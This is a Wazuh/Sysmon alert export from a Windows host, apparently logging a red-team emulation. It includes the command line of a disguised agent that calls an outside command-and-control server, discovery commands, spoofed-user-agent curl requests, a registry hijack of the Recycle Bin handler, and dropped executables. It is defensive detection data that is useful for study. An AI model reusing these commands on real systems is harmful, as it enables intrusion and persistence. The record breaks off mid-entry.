{15959494-7b75-6758-ddac-0e0000000000},cmd.exe /C tasklist.exe &amp;&amp; sc query &amp;&amp; sc query state= all,0xeacdd,4924,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,sc  query state= all,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,O_RRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1187,technique_name=Forced Authentication
UtcTime: 2024-12-10 18:01:58.022
ProcessGuid: {15959494-8213-6758-de03-000000000300}
ProcessId: 9728
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\test10.lnk
CreationUtcTime: 2024-12-10 18:01:58.022
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:01:58.0470222Z,10111,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,9,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe created a new scripting file under Windows Temp or User data folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92201,windows_eventchannel,log,"Dec 10, 2024 @ 18:01:58.851",EventChannel,1733853718,"Dec 10, 2024 @ 18:01:58.851", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8213-6758-de03-000000000300},9728,01:58.0, ,"technique_id=T1187,technique_name=Forced Authentication", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer"",""Command and Scripting Interpreter""]","[""T1105"",""T1059""]","[""Command and Control"",""Execution""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\test10.lnk,01:58.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,PPRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 18:02:01.192
ProcessGuid: {15959494-8219-6758-eb03-000000000300}
ProcessId: 6364
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C net.exe start >> %%temp%%\service-list.txt
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:02:02.2108271Z,10115,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,8,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 18:02:03.015",EventChannel,1733853723,"Dec 10, 2024 @ 18:02:03.015", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-8219-6758-eb03-000000000300},6364,02:01.2,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C net.exe start &gt;&gt; %%temp%%\\service-list.txt,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,RPRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1105,technique_name=Ingress Tool Transfer
UtcTime: 2024-12-10 18:02:54.793
ProcessGuid: {15959494-824e-6758-0004-000000000300}
ProcessId: 9288
Image: C:\Windows\System32\curl.exe
FileVersion: 8.9.1
Description: The curl executable
Product: The curl executable
Company: curl, https://curl.se/
OriginalFileName: curl.exe
CommandLine: C:\Windows\System32\Curl.exe  -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 www.google.com  
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=FA8E9959DDF23A8FE1226B3BA48CF6D683C561A8,MD5=6DF52ACFBF5F48630841F469D6691FB5,SHA256=8B39C07EC671DAFB125BDC0E5FD4D51BC4A7D73E505C63C95F976698BBBD5699,IMPHASH=5AB6BFAF3A98F68848DE5330AE012619
ParentProcessGuid: {15959494-824e-6758-fe03-000000000300}
ParentProcessId: 6800
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -s -A ""HttpBrowser/1.0"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""*<|>*"" -m3 www.google.com >nul 2>&1
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:02:54.7941102Z,10181,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,10,FALSE,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032,windows_eventchannel,log,"Dec 10, 2024 @ 18:02:55.049",EventChannel,1733853775,"Dec 10, 2024 @ 18:02:55.049", , , , , ,curl.exe,C:\\Windows\\System32\\curl.exe,The curl executable, , ,The curl executable, , ,{15959494-824e-6758-0004-000000000300},9288,02:54.8,"SHA1=FA8E9959DDF23A8FE1226B3BA48CF6D683C561A8,MD5=6DF52ACFBF5F48630841F469D6691FB5,SHA256=8B39C07EC671DAFB125BDC0E5FD4D51BC4A7D73E505C63C95F976698BBBD5699,IMPHASH=5AB6BFAF3A98F68848DE5330AE012619","technique_id=T1105,technique_name=Ingress Tool Transfer","curl, https://curl.se/",8.9.1,DESKTOP-QGB4EQH\\mari,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , , , , , , , , , ,{15959494-824e-6758-fe03-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"cmd.exe /C C:\\Windows\\System32\\Curl.exe -s -A \""HttpBrowser/1.0\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Wget/1.9+cvs-stable (Red Hat modified)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Opera/8.81 (Windows NT 6.0; U; en)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""*&lt;|&gt;*\"" -m3 www.google.com &gt;nul 2&gt;&amp;1",0xeacdd,6800,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,"C:\\Windows\\System32\\Curl.exe  -s -A \""Wget/1.9+cvs-stable (Red Hat modified)\"" -m3 www.google.com",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,RfRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1105,technique_name=Ingress Tool Transfer
UtcTime: 2024-12-10 18:02:55.344
ProcessGuid: {15959494-824f-6758-0104-000000000300}
ProcessId: 8600
Image: C:\Windows\System32\curl.exe
FileVersion: 8.9.1
Description: The curl executable
Product: The curl executable
Company: curl, https://curl.se/
OriginalFileName: curl.exe
CommandLine: C:\Windows\System32\Curl.exe  -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 www.google.com  
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=FA8E9959DDF23A8FE1226B3BA48CF6D683C561A8,MD5=6DF52ACFBF5F48630841F469D6691FB5,SHA256=8B39C07EC671DAFB125BDC0E5FD4D51BC4A7D73E505C63C95F976698BBBD5699,IMPHASH=5AB6BFAF3A98F68848DE5330AE012619
ParentProcessGuid: {15959494-824e-6758-fe03-000000000300}
ParentProcessId: 6800
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -s -A ""HttpBrowser/1.0"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""*<|>*"" -m3 www.google.com >nul 2>&1
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:02:55.3456683Z,10183,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,11,FALSE,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032,windows_eventchannel,log,"Dec 10, 2024 @ 18:02:56.009",EventChannel,1733853776,"Dec 10, 2024 @ 18:02:56.009", , , , , ,curl.exe,C:\\Windows\\System32\\curl.exe,The curl executable, , ,The curl executable, , ,{15959494-824f-6758-0104-000000000300},8600,02:55.3,"SHA1=FA8E9959DDF23A8FE1226B3BA48CF6D683C561A8,MD5=6DF52ACFBF5F48630841F469D6691FB5,SHA256=8B39C07EC671DAFB125BDC0E5FD4D51BC4A7D73E505C63C95F976698BBBD5699,IMPHASH=5AB6BFAF3A98F68848DE5330AE012619","technique_id=T1105,technique_name=Ingress Tool Transfer","curl, https://curl.se/",8.9.1,DESKTOP-QGB4EQH\\mari,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , , , , , , , , , ,{15959494-824e-6758-fe03-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"cmd.exe /C C:\\Windows\\System32\\Curl.exe -s -A \""HttpBrowser/1.0\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Wget/1.9+cvs-stable (Red Hat modified)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Opera/8.81 (Windows NT 6.0; U; en)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""*&lt;|&gt;*\"" -m3 www.google.com &gt;nul 2&gt;&amp;1",0xeacdd,6800,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,"C:\\Windows\\System32\\Curl.exe  -s -A \""Opera/8.81 (Windows NT 6.0; U; en)\"" -m3 www.google.com",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,R_RRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:02:59.295
ProcessGuid: {15959494-8253-6758-0304-000000000300}
ProcessId: 7036
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_dinuauyw.nej.ps1
CreationUtcTime: 2024-12-10 18:02:59.295
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:02:59.3078918Z,10198,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,27,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:03:00.124",EventChannel,1733853780,"Dec 10, 2024 @ 18:03:00.124", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8253-6758-0304-000000000300},7036,02:59.3, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_dinuauyw.nej.ps1,02:59.3, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,SPRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:03:09.463
ProcessGuid: {15959494-8253-6758-0304-000000000300}
ProcessId: 7036
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_nbyhz4po.u4i.ps1
CreationUtcTime: 2024-12-10 18:03:09.463
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:03:09.4648154Z,10230,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,28,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:03:10.233",EventChannel,1733853790,"Dec 10, 2024 @ 18:03:10.233", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8253-6758-0304-000000000300},7036,03:09.5, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_nbyhz4po.u4i.ps1,03:09.5, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,S_RRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:04:02.732
ProcessGuid: {15959494-8292-6758-1904-000000000300}
ProcessId: 9592
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_hygaecjz.abs.ps1
CreationUtcTime: 2024-12-10 18:04:02.732
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:04:02.7372850Z,10262,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,29,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:04:03.218",EventChannel,1733853843,"Dec 10, 2024 @ 18:04:03.218", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8292-6758-1904-000000000300},9592,04:02.7, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_hygaecjz.abs.ps1,04:02.7, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,TvRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad,1014,0x4000000010000000,{1c95126e-7eea-49a9-a3fe-a378b03ddb4d},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-12-10T18:04:12.2858509Z,483,2848,DESKTOP-QGB4EQH,1014,1608,WARNING,Microsoft-Windows-DNS-Client,4,FALSE,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109,windows_eventchannel,log,"Dec 10, 2024 @ 18:04:13.121",EventChannel,1733853853,"Dec 10, 2024 @ 18:04:13.121", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,UfRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1187,technique_name=Forced Authentication
UtcTime: 2024-12-10 18:04:17.052
ProcessGuid: {15959494-8296-6758-2604-000000000300}
ProcessId: 2800
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\test10.lnk
CreationUtcTime: 2024-12-10 18:01:58.022
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:04:17.0654551Z,10337,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,9,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe created a new scripting file under Windows Temp or User data folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92201,windows_eventchannel,log,"Dec 10, 2024 @ 18:04:17.912",EventChannel,1733853857,"Dec 10, 2024 @ 18:04:17.912", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8296-6758-2604-000000000300},2800,04:17.1, ,"technique_id=T1187,technique_name=Forced Authentication", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer"",""Command and Scripting Interpreter""]","[""T1105"",""T1059""]","[""Command and Control"",""Execution""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\test10.lnk,01:58.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,U_RRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:04:17.769
ProcessGuid: {15959494-82a1-6758-3704-000000000300}
ProcessId: 3764
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_mpvjdq2z.nkc.ps1
CreationUtcTime: 2024-12-10 18:04:17.769
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:04:17.7821070Z,10349,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,31,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:04:18.083",EventChannel,1733853858,"Dec 10, 2024 @ 18:04:18.083", , , , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-82a1-6758-3704-000000000300},3764,04:17.8, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mpvjdq2z.nkc.ps1,04:17.8, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,VfRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-12-10 18:04:21.801
ProcessGuid: {15959494-82a1-6758-3704-000000000300}
ProcessId: 3764
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\a.exe
CreationUtcTime: 2024-12-10 18:02:06.597
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:04:21.8161181Z,10383,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,32,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:04:22.596",EventChannel,1733853862,"Dec 10, 2024 @ 18:04:22.596", , , , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-82a1-6758-3704-000000000300},3764,04:21.8, , , , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\a.exe,02:06.6, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,V_RRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-12-10 18:05:04.206
ProcessGuid: {15959494-82d0-6758-4804-000000000300}
ProcessId: 1544
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:05:04.2087401Z,10444,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,10,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 18:05:04.984",EventChannel,1733853904,"Dec 10, 2024 @ 18:05:04.984", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-82d0-6758-4804-000000000300},1544,05:04.2,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C reg ADD \""HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\"" /ve /d \""calc.exe\"" /f",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,WPRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-12-10 18:05:04.220
ProcessGuid: {15959494-82d0-6758-4904-000000000300}
ProcessId: 1856
Image: C:\Windows\System32\reg.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
